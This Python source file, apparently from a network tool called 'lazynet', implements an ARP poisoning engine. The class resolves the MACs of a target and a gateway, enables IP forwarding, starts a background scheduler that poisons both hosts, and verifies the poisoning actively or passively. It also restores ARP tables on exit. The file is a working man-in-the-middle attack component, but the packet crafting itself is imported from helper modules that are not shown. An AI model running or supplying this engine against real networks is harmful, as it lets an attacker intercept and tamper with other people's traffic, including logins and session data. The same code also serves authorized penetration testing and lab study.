import atexit
import logging
import signal
import sys

from scapy.all import get_if_hwaddr

from ..shared.arp_resolve import resolve_mac
from ..shared.constants import IS_WINDOWS
from ..shared.forwarding import clear_arp_entry, disable_ip_forwarding, enable_ip_forwarding, pin_gateway_arp
from ..shared.netinfo import get_interface_ipv4, get_local_ips, get_local_macs
from .config import HostInfo
from .helpers import restore_arp_entry
from .scheduler import PoisonScheduler
from .verify import verify as run_verification


logger = logging.getLogger("lazynet")


class ARPPoisoningEngine:
    """full ARP poisoning engine

    Typical use:
        config = ARPConfig(target_ip="192.168.1.100", gateway_ip="192.168.1.1")
        with ARPPoisoningEngine(config) as arp_engine:
            time.sleep(30)
            print(arp_engine.verify())

    Manual use:
        arp_engine = ARPPoisoningEngine(config)
        arp_engine.start()
        ...
        arp_engine.stop()
    """

    def __init__(self, config):
        self.config = config
        self.running = False
        self.cleaned_up = False
        self.scheduler = None
        self.forwarding_enabled = False

        # Resolved by start()
        self.target = None
        self.gateway = None
        self.attacker_mac = None
        self.attacker_ip = None

    # ----------------------------- lifecycle -----------------------------

    def start(self):
        """Resolve hosts, enable forwarding, start poisoning"""
        if self.running:
            return self

        # Register cleanup first, so a failure further down still restores anything we changed
        self.register_cleanup()


        self.resolve_hosts()
        self.run_safety_check()

        clear_arp_entry(self.gateway.ip)
        pin_gateway_arp(self.gateway.ip, self.gateway.mac)

        enable_ip_forwarding()
        self.forwarding_enabled = True

        self.start_scheduler()
        self.running = True
        return self

    def stop(self):
        """Stop poisoning, restore ARP tables, disable forwarding"""
        if self.cleaned_up:
            return
        
        self.cleaned_up = True
        self.running = False

        if self.scheduler is not None:
            self.scheduler.stop()

        if self.target is not None and self.gateway is not None:
            self.restore_tables()

        clear_arp_entry(self.gateway.ip)

        if self.forwarding_enabled:
            disable_ip_forwarding()
            self.forwarding_enabled = False

    # ----------------------------- verification -----------------------------

    def verify(self, method="auto", timeout=None):
        """Return a VerificationResult for the current poisoning state

        method  : 'passive' (sends nothing),
                  'active' (sends one probe),
                  'auto' runs passive and falls back to active if passive fails
        timeout : seconds to wait, defaults to config.verify_timeout
        """
        if timeout is None:
            timeout = self.config.verify_timeout

        if self.target is None:
            raise RuntimeError("ARP poisoning engine has not been started yet")

        if method == "auto":
            passive_result = self._run_verification("passive", timeout)
            if passive_result:
                return passive_result
            logger.info("Passive verification did not confirm poisoning, falling back to active verification")
            return self._run_verification("active", timeout)

        return self._run_verification(method, timeout)

    def _run_verification(self, method, timeout):
        """
        Run one verification attempt and swallow unexpected errors
        """
        try:
            return run_verification(
                method=method,
                target=self.target,
                gateway=self.gateway,
                attacker_mac=self.attacker_mac,
                attacker_ip=self.attacker_ip,
                interface=self.config.interface,
                timeout=timeout,
                verbose=self.config.verbose,
            )
        except Exception as error:
            logger.debug(f"Verification {method} raised: {error}")
            return None

    # ----------------- introspection -----------------

    def status(self):
        """Return a small dictionary describing the current state"""
        return {
            "running": self.running,
            "target": self.target,
            "gateway": self.gateway,
            "attacker_mac": self.attacker_mac,
            "attacker_ip": self.attacker_ip,
            "interface": self.config.interface,
            "direction": self.config.direction,
        }

    def __enter__(self):
        self.start()
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        self.stop()
        return False

    def __repr__(self):
        return (
            f"ARPPoisoningEngine(target={self.config.target_ip}, gateway={self.config.gateway_ip},"
            f"direction={self.config.direction}, running={self.running})"
            )




    # ----------------- internals -----------------
    def resolve_hosts(self):
        """Resolve any missing MACs and build HostInfo objects"""
        config = self.config

        target_mac = config.target_mac
        if not target_mac:
            target_mac = resolve_mac(config.target_ip, config.interface)

        gateway_mac = config.gateway_mac
        if not gateway_mac:
            gateway_mac = resolve_mac(config.gateway_ip, config.interface)

        if not target_mac:
            raise RuntimeError(f"Could not resolve MAC for target {config.target_ip}")
        if not gateway_mac:
            raise RuntimeError(f"Could not resolve MAC for gateway {config.gateway_ip}")

        config.target_mac = target_mac
        config.gateway_mac = gateway_mac

        self.target = HostInfo(config.target_ip, target_mac)
        self.gateway = HostInfo(config.gateway_ip, gateway_mac)
        self.attacker_mac = get_if_hwaddr(config.interface)
        self.attacker_ip = get_interface_ipv4(config.interface)

    def run_safety_check(self):
        """Refuse to run if the target or gateway is one of our own"""
        if self.config.skip_self_check:
            return

        own_ips = get_local_ips()
        own_macs = get_local_macs()

        if self.target.ip in own_ips:
            raise RuntimeError(f"Target IP {self.target.ip} is one of this machine's own IPs")
        if self.gateway.ip in own_ips:
            raise RuntimeError(f"Gateway IP {self.gateway.ip} is one of this machine's own IPs")
        if self.target.mac.lower() in own_macs:
            raise RuntimeError(f"Target MAC {self.target.mac} matches a local MAC.")
        if self.gateway.mac.lower() in own_macs:
            raise RuntimeError(f"Gateway MAC {self.gateway.mac} matches a local MAC.")

    def start_scheduler(self):
        """Start the background poison scheduler"""
        self.scheduler = PoisonScheduler(
            target=self.target,
            gateway=self.gateway,
            attacker_mac=self.attacker_mac,
            interface=self.config.interface,
            direction=self.config.direction,
            interval=self.config.poison_interval,
            verbose=self.config.verbose,
        )
        self.scheduler.start()

    def restore_tables(self):
        """Re-ARP both sides with the correct MACs"""
        config = self.config

        # sent to victim
        restore_arp_entry(
            destination_ip=config.target_ip,
            destination_mac=config.target_mac,
            source_ip=config.gateway_ip,
            source_mac=config.gateway_mac,
            interface=config.interface,
        )

        # sent to gateway
        restore_arp_entry(
            destination_ip=config.gateway_ip,
            destination_mac=config.gateway_mac,
            source_ip=config.target_ip,
            source_mac=config.target_mac,
            interface=config.interface,
        )

    def register_cleanup(self):
        """Wire up atexit and signal handlers so we always clean up"""
        atexit.register(self.stop)
        signal.signal(signal.SIGINT, self.handle_signal)
        if IS_WINDOWS:
            signal.signal(signal.SIGBREAK, self.handle_signal)

    def handle_signal(self, signum, frame):
        """Called on Ctrl+C clean up and exit"""
        self.stop()
        sys.exit(0)